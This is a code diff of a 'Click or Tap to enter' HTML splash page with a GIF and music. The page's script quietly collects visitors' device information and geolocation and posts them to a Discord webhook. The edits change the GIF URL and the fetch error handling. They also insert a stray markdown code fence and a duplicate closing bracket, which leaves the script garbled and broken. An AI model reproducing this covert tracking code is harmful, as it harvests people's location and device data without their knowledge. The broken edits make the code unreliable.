@@ -28,7 +28,7 @@
 <body>
   <h1 id="click-to-enter">Click or Tap to enter...</h1>
   <div id="info"></div>
-  <img id="gif" src="https://tenor.com/bGfSD.gif" alt="Loading GIF" />
+  <img id="gif" src="https://media.tenor.com/images/2e0c3f0a53c1b5a4f9c0c9d1a7e8e8a8/tenor.gif" alt="Loading GIF" />
   <audio id="music" src="https://raw.githubusercontent.com/CosmoGT-dev/CosmoGT-Website/main/Me%20right%20now.mp3" preload="auto"></audio>
   <script>
     // Discord Webhook URL
@@ -103,13 +103,13 @@
               },
               body: JSON.stringify(webhookPayload)
             })
+```javascript
+            })
              .then(response => {
                console.log('Device information sent successfully');
                hasSentInfo = true; // Set the flag to true after sending
              })
-             .catch(error =>```javascript
-               console.error('Failed to send device information:', error);
-             });
+             .catch(error => console.error('Failed to send device information:', error));
           }, error => {
             console.error('Failed to get geolocation:', error);
           }, {
